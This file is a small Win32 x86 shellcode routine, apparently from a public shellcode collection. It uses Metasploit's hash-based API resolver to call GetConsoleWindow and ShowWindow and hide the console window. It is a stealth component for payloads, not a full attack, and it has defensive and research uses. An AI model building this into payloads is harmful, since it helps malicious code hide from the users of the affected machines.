;# Win32 - Hide Console Window
;# Date: [11.02.2017]
;# Author: [Ege Balcı]
;# Tested on: [Win XP/Vista/7/8/8.1/10]


[BITS 32]
[ORG 0]


	pushad                     ; Save all registers to stack
	pushfd                     ; Save all flags to stack
	cld                        ; Clear direction flags
	call start      
	%include "../block_api.asm"; Stephen Fewer's hash API from metasploit project
start:
    pop ebp                    ; Pop the address of SFHA
    push 0x00000000	           ; Push the byte 'user32' ,0,0
    push 0x00003233            ; ... 
    push 0x72657375            ; ...
    push esp                   ; Push a pointer to the "user32" string on the stack.
    push 0x0726774C            ; hash( "kernel32.dll", "LoadLibraryA" )
    call ebp                   ; LoadLibraryA( "user32" )
    add esp,0x0C               ; Clear the stack
    push 0xCE726E89            ; hash("user32.dll", "GetConsoleWindow")
    call ebp                   ; GetConsoleWindow();
    push 0x00000000	           ; NULL
    push eax                   ; Console window handle
    push 0x6E2EEBC2	           ; hash(User32.dll, ShowWindow)
    call ebp		           ; ShowWindow(HANDLE,SW_HIDE);
    popfd                      ; Pop back all saved flags
    popad                      ; Pop back all saved registers
    ret                        ; <-
